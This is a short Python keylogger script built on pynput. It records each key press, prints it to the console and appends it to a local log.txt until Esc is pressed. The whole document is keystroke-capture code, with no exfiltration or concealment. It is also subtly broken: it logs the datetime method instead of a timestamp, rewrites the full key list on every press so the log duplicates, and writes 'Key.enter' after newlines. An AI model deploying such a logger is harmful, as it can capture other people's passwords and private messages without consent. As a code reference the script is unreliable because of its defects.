import pynput
from pynput.keyboard import Key,Listener
import datetime


keys = []


def create_file():
    try:
        with open("log.txt","x") as f:
            f.write(f"{str(datetime.datetime.now)}")
    except FileExistsError:
        print(f"File already exists.")

def on_press(key):
    keys.append(key)
    write_file(keys)

    try:
        print("key {0} pressed".format(key.char))
    except AttributeError:
        print("special key {0}".format(key))

def write_file(keys):

    with open("log.txt","a") as f:
        for key in keys:

            k = str(key).replace("'","")
            if key == Key.enter:
                f.write("\n")
            elif key == Key.space:
                k = str(key).replace("Key.space"," ")
            f.write(k)

def on_release(key):

    print("{0} released".format(key))
    if key == Key.esc:
        return False
    
create_file()

with Listener(on_press=on_press,
              on_release= on_release) as listener:
    listener.join()
    